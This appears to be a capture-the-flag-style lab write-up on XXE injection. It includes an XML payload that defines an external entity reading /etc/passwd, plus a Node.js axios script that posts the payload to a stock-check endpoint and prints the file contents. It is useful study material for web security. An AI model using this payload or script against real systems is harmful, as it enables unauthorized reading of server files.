# 1 - XXE To Retrieve Files

### Notes

The stock checker feature uses XML to query stock levels by product id and store id. It is vulnerable to XXE injection.

We can define our own external entity by adding a DOCTYPE element. Our entity will reference the `/etc/passwd` filepath for its definition.

```http
POST /product/stock HTTP/1.1

...

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>2</storeId>
</stockCheck>
```

### Scripted Solution

```javascript
const axios = require('axios').default
require('dotenv').config({ path: './.env' })

/**
 * Run exploit.
 */
async function main() {
  const labUrl = process.env.LAB_URL

  /**
   * <?xml version="1.0" encoding="UTF-8"?>
   * <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
   * <stockCheck>
   *   <productId>&xxe;</productId>
   *   <storeId>2</storeId>
   * </stockCheck>
   */
  const xxe = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><stockCheck><productId>&xxe;</productId><storeId>2</storeId></stockCheck>'

  try {
    await axios.post(`${labUrl}/product/stock`, xxe, {
      headers: { 'Content-Type': 'text/xml' }
    })
  } catch (error) {
    console.log(error.response.data)
  }
}

main()
  .then(() => process.exit(0))
  .catch(error => {
    console.error(error)
    process.exit(1)
  })
```
